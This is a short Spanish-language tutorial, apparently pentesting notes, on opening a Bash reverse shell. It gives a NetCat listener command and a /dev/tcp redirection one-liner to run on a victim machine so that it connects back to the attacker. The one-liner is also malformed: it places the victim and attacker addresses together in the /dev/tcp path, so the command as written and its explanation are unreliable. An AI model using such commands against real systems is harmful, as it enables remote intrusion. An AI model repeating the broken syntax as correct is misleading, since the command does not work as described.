# Bash Reverse Shell

Mediante Bash podemos establecer una shell inversa en la que poder utilizar una gran variedad de herramientas.
En primer lugar, antes debemos tener en cuenta que ciertos detalles sobre la Bash Reverse Shell:
* No funcionará en equipos Windows, ya que estos no tienen instalado Bash.
* Tampoco funcinará en sistemas Unix que no tengan Bash instalado, en tal caso, podemos usar `sh`.

Para establecer una reverse shell en bash simplemente nos ponemos en escucha con `NetCat` por el puerto deseado:

    nc -lvnp PUERTO

`Ejemplo:`

    nc -lvnp 443
    
Luego desde el esquipo objetivo ejecutamos el siguiente comando para establecer la reverse shell:

    /bin/bash -i >& /dev/tcp/[Ip Víctima]/[Ip Atacante]-Puerto 0>&1
    
`Ejemplo:`

    /bin/bash -i >& /dev/tcp/10.10.10.10/10.10.14.14-443 0>&1
    
Mediante este comando estamos estableciendo una reverse shell desde el equipo víctima (10.10.10.10) a nuestro equipo (10.10.14.14) por nuestro
puerto 443.

Si todo ha funcionado correctamente veremos como en la terminal donde estábamos en escucha con NetCat se nos abre la reverse shell.
  
